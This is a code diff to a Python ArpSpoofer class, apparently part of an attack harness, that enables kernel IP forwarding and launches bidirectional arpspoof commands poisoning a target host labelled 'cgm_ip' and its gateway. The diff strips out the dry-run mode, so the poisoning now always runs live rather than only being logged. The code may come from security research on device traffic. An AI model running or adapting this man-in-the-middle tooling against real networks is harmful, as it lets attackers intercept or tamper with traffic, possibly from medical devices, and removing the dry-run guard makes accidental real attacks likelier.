@@ -16,19 +16,14 @@ _IP_FORWARD_PATH = Path("/proc/sys/net/ipv4/ip_forward")
 class ArpSpoofer:
     """Enable IP forwarding and run bidirectional ARP spoofing."""
 
-    def __init__(self, config: AttackerConfig, dry_run: bool = False) -> None:
+    def __init__(self, config: AttackerConfig) -> None:
         self._cfg = config
-        self._dry_run = dry_run
         self._processes = []
 
     def enable_ip_forwarding(self) -> None:
         """Enable kernel IP forwarding if configured."""
         if not self._cfg.enable_ip_forwarding:
             LOGGER.info("ip_forwarding disabled in config, skipping")
-            return
-
-        if self._dry_run:
-            LOGGER.info("dry_run: echo 1 > %s", _IP_FORWARD_PATH)
             return
 
         try:
@@ -44,10 +39,6 @@ class ArpSpoofer:
         """Disable kernel IP forwarding."""
         if not self._cfg.enable_ip_forwarding:
             LOGGER.info("ip_forwarding cleanup skipped by config")
-            return
-
-        if self._dry_run:
-            LOGGER.info("dry_run: echo 0 > %s", _IP_FORWARD_PATH)
             return
 
         try:
@@ -73,12 +64,6 @@ class ArpSpoofer:
         cmd_a = ["arpspoof", "-i", iface, "-t", cgm_ip, gw_ip]
         # Poison gateway: tell it that cgm_ip is at the attacker-node MAC
         cmd_b = ["arpspoof", "-i", iface, "-t", gw_ip, cgm_ip]
-
-        if self._dry_run:
-            LOGGER.info("dry_run arp_direction_a: %s", " ".join(cmd_a))
-            LOGGER.info("dry_run arp_direction_b: %s", " ".join(cmd_b))
-            LOGGER.info("dry_run: verify with: arp -n on each target machine")
-            return
 
         LOGGER.info("starting arp_direction_a: %s", " ".join(cmd_a))
         self._processes.append(
